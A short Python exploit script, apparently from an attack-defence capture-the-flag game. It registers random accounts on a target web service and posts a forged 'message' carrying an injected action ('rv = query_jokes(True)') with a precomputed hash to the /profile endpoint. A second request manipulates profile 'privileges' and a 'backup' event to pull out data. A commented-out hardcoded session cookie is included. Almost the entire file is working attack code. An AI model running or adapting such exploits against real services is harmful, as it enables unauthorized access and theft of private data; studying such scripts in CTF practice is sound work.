#!/usr/bin/env python3
import json
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests

IP_ADDRESS = sys.argv[1]
PORT = 5000
TARGET_URL = f'http://[{IP_ADDRESS}]:{PORT}'


s = requests.Session()
user = {
    "name": utils.username(max=16),
    "password": utils.password(max=16)
}
s.post(f"{TARGET_URL}/register", data=user)
s.post(f"{TARGET_URL}/login", data=user)

#headers = {'cookie': 'session=.eJwlzjEOwzAIQNG7eO4AxoCdy0QYg9o1aaaqd2-kbn_6ep-y5xHns2zv44pH2V-rbAWUtXYOXiITJbz66oPDfSoPJWweY0nUqTLNQCxbb3S3q2HaAEEyvwfdezVtAxQhdNTITPBBNW1yp-6VOCUEqBECo5Bb93JDrjOOvwZb-f4A9v8vSA.ZQ7-GQ.q9lN3h5zankSQlulv8tTexIl7ko', 'content-type': 'application/x-www-form-urlencoded'}

data = {'message': '{"action": "rv = query_jokes(True)"}', 'hash': 'a07f3f73745c9e53ce4afb3cca5fa99626061d4013758041f1dd97ba27096d4308043eb0fa011245bcad04a2893f5b81e7b723e29bbf29fc3c52136cbd3f52f13b25d8cdff67f1b0e210a984cfc699454e16ea2e166583e2abab662c268d0f0a743c9967da0c245c2f431434e6fbf2c3d7cc8b93994584f7b9a062e85fa092f76bab4d34a54cb39f6a13aca0ba1cf99d3797cde10813e479093bd90c276df470e61849967d2e50e6a789ca0b48cd20564527df7022ab00bc3c47aeda552712401cd1f241c1237eb9325f37b62125de59ee077dad26d8c58f3e19a878c23cf8e5698ab5a0f0e69ad667dca85c541bb39e8cc90f68192eabffe2010a632e47e9ff'}

res = s.post(f"{TARGET_URL}" + '/profile', data=data)
print(res.text)

s = requests.Session()
user = {
    "name": utils.username(max=16),
    "password": utils.password(max=16)
}
s.post(f"{TARGET_URL}/register", data=user)
s.post(f"{TARGET_URL}/login", data=user)

profile = {
    "privileges": "public",
    "event": "backup"
}
print(s.post(f"{TARGET_URL}/profile", data=profile).text)

print(res.text)